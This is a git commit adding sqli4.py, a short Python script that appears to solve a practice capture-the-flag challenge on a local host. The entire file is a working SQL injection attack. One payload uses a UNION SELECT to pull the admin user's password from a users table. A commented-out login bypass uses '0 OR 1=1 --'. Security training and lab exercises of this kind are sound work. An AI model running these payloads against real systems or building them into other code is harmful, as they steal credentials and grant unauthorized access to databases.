65169aa1162ec3f84b9b7f8d66f0dcea877014bc
CJBly <cjbly@asu.edu>
2025-08-27 16:37:59 -0700

    Create sqli4.py

---
+++ sqli4.py
@@ -0,0 +1,13 @@
+import requests
+
+#session = requests.Session()
+url = "http://challenge.localhost/"
+payload1 = '" UNION SELECT password FROM users_6262942757 WHERE username=\'admin\' --'
+#data = {
+    #"user-handle": "admin",
+    #"pin": "0 OR 1=1 --"
+#}
+params = {"query": payload1}
+#session.post(url, data=data)
+response = requests.get(url, params=params)
+print(response.text)
